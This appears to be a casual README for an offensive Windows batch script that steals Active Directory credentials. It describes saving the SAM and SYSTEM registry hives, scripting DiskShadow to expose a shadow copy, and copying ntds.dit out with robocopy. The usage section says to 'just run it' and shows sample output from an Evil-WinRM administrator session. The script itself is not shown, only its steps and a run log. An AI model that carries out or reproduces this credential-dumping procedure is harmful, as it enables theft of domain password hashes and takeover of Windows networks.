README file I guess
=======================================

It uses robocopy to exploit registry keys and robocopy while also iterating through drive letters with DiskShadow to expose a shadow copy of the NTDS directory for extraction.


Description:
-------------
- Deletes any existing NTDS, SAM, SYSTEM, and ntds.dit files in the current directory. 
- Saves the SAM and SYSTEM registry hives.
- Verifies that the C:\Windows\ntds directory exists.
- Checks if drive already exists
  - Iterates through drive letters from Z to A (skipping those in use) to find an available drive.
- Creates a DiskShadow script for you
- Runs DiskShadow and checks if the shadow copy is available.
- Uses Robocopy to copy the ntds.dit file from the exposed shadow copy, then renames it to NTDS.
- Cleans up temporary files (like shadow.dsh and diskshadow output logs) after execution.




USAGE:
======================================

Literally just run it LOL

```./script.bat```

example of it running:

```BAT
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\script.bat

[*] Saving registry hives...
The operation completed successfully.

The operation completed successfully.

[+] Registry hives saved successfully.

[*] NTDS directory detected.

[-] Drive letter Z is already in use.
[*] Found existing shadow copy on drive Z, extracting files...

Log File : C:\Users\Administrator\Documents\robocopy.log
[*] Renaming ntds.dit to NTDS...
[+] File successfully renamed to NTDS.
[*] Operation completed successfully.
Press any key to continue . . .
```


